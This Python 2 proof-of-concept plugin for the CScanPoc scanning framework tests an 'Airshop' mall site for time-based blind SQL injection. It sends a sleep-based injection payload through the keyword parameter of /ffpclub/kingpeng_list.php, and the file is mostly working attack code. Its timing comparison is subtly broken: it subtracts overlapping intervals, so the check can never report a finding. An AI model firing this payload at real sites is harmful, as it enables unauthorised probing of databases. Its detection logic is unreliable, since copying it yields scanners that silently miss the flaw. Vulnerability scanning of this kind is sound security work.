# coding:utf-8
import time
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Airshop_0101' # 平台漏洞编号
    name = '航空金鹏商城sql注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2016-05-10'  # 漏洞公布时间
    desc = '''
    航空金鹏商城sql注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=205460
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Airshop'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'ea670755-1150-4104-8e33-184886d00226' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-26' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + '''/ffpclub/kingpeng_list.php?keyword=if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/'''
            url1 = self.target + "/ffpclub/kingpeng_list.php?keyword=hyhmnn"
            start_time1 =time.time()
            _response = requests.get(url)
            end_time1 =time.time()
            _response = requests.get(url1)
            end_time2 =time.time() 
            if (end_time1-start_time1) - (end_time2-start_time1) >= 5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()